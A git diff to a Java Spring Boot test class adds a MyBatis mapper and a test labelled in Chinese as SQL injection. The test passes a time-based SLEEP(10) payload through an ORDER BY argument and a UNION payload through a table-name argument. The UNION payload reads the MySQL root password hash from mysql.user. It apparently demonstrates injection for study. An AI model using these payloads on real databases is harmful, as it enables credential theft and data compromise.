@@ -4,17 +4,22 @@ import com.google.common.collect.Iterables;
 import com.google.common.collect.Lists;
 
 import org.junit.jupiter.api.Test;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.boot.test.context.SpringBootTest;
 
 import java.util.stream.Collectors;
 import java.util.stream.Stream;
 
+import generator.mapper.ArticleTypeMapper;
 import lombok.val;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 
 @SpringBootTest
 class ApplicationTest {
+
+  @Autowired
+  ArticleTypeMapper articleTypeMapper;
 
   @Test
   void finsElement() {
@@ -51,5 +56,18 @@ class ApplicationTest {
     System.out.println("b = " + b);
     System.out.println("c = " + c);
     assertEquals(Lists.newArrayList("1", "2", "3","4", "42", "43"), c);
+  }
+
+/**
+*mybatis sql 注入
+*/
+  @Test
+  void testMybatis(){
+    // 睡眠10s
+    val allOrder = articleTypeMapper.findAllOrder("id", "desc , (SELECT(1) FROM (SELECT(SLEEP(10))) test)");
+    System.out.println(allOrder);
+    // 获取 mysql 密码
+    val selectRoot = articleTypeMapper.findAllByTable("article_type union  SELECT 10086 AS id, NULL, authentication_string AS typename FROM mysql.user WHERE USER LIKE \"%root%\"");
+    System.out.println(selectRoot);
   }
 }
